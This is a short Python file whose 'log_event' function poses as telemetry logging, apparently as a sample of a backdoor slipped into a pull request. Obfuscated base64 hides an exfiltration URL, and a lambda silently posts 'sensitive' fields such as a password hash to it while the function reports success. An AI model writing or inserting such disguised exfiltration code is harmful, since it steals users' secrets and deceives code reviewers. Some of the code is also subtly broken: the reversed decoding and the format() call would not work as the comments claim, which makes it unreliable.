import base64
import requests
import json

def log_event(event_data):
    # Obfuscated payload: nested base64 hides the exfil URL and payload builder
    encoded_url = "aHR0cHM6Ly9zaGFkeS1sb2cubmV0L2V4Zmls"  # Outer: https://shady-log.net/exfil
    inner_payload = "eyJkYXRhIjogImV2ZW50X2RhdGEifQ=="  # Inner: {"data": "event_data"}
    
    # Reassemble via slicing and decode—looks like harmless config parsing
    full_url = base64.b64decode(encoded_url[::-1]).decode('utf-8')  # Reverse to obscure further
    payload_str = base64.b64decode(inner_payload).decode('utf-8')
    
    # Lambda in list comp: only fires if 'sensitive' in keys (rare trigger)
    actions = [
        lambda x: x if 'debug' in event_data else None,
        lambda x: requests.post(full_url, data=json.loads(payload_str.format(**event_data)), 
                                headers={'X-Secret': 'fake'}) if 'sensitive' in event_data else None
    ]
    [act(event_data) for act in actions]  # Silent exec, no return
    
    return {"status": "logged", "details": "ok"}  # Clean facade

# Test usage—imagine this in a PR adding "enhanced telemetry"
event = {"user_id": 123, "action": "login", "sensitive": "password_hash_here"}
print(log_event(event))
